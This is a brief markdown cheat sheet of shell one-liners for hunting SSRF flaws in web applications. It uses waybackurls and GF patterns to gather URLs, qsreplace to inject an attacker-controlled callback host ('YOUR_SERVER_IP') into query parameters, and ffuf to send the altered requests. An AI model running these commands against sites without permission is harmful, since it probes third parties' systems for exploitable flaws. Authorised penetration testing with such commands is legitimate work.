# ONE-LINE COMMANDs

<b> Make sure you have Go installed on your Machine </b>

> First method
- Use [Waybackurls](https://github.com/tomnomnom/waybackurls) by Tomnomnom to Fetch URLS for Specific Target.
- Use [GF patterns](https://github.com/1ndianl33t/Gf-Patterns) to find Possible ssrf Vulnerable Parameters.

## Using qsreplace
> Second Method
- [qsreplace](https://github.com/tomnomnom/qsreplace)

```sh
cat /path/to/urls.txt | grep = | qsreplace -a | tee equals.txt
```

```sh
cat equals.txt | qsreplace http://YOUR_SERVER_IP | tee ssrf.txt
```

## Hunt ssrf using FFUF?

```sh
ffuf -w ssrf.txt:FUZZ -u FUZZ -mc 200
```

```sh
ffuf -u FUZZ -w ssrf.txt:FUZZ -replay-proxy http://127.0.0.1:8080 -mc 200
```

